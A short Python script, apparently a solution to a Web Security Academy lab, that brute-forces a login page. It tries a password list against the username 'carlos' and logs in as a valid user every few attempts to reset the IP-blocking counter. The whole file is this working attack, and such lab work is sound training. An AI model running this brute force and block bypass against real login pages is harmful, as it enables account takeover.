#!/usr/bin/python3
import requests
import warnings

# Ignore any and all warnings and don't show it on cmd output
warnings.simplefilter("ignore")

# request body in dictionary
payload = {"username": "carlos", "password": "admin"}
validPayload = {"username": "wiener", "password": "peter"}
url="https://0ae800cc04c5982b853a446300120068.web-security-academy.net/login"

def enum_password(validUsers):
    # List of usernames to enumerate.
    passwords = list()

    # Read users.lst and store it in a list to be used further
    with open("./passwords.lst", "rt") as passlst:
        for password in passlst.readlines():
            passwords.append(password.strip())
    
    numberOfRequestsBeforeBlocking = 0
    for user in validUsers:
        print("[*] For username", user, sep=": ")
        payload["username"] = user # change the placeholder of username field to the user from users list

        for password in passwords:
            print("\t[*] Trying password", password, sep=": ")
            payload["password"] = password # change the placeholder of password field to the password from passwords list

            # If number of requests reach to a point when IP will be blocked then change the IP
            if numberOfRequestsBeforeBlocking == 2:
                numberOfRequestsBeforeBlocking = 0
                requests.post(url, data=validPayload, verify=False)
        
            # Send the HTTP POST request to the url
            response = requests.post(url, data=payload, verify=False)

            # check if the "Invalid password" is in the response, if not then valid password
            if "Incorrect password" not in response.text:
                print(f"\t\t[+] Found valid username:password pair {user}:{password}")
                break
            numberOfRequestsBeforeBlocking += 1

enum_password(['carlos'])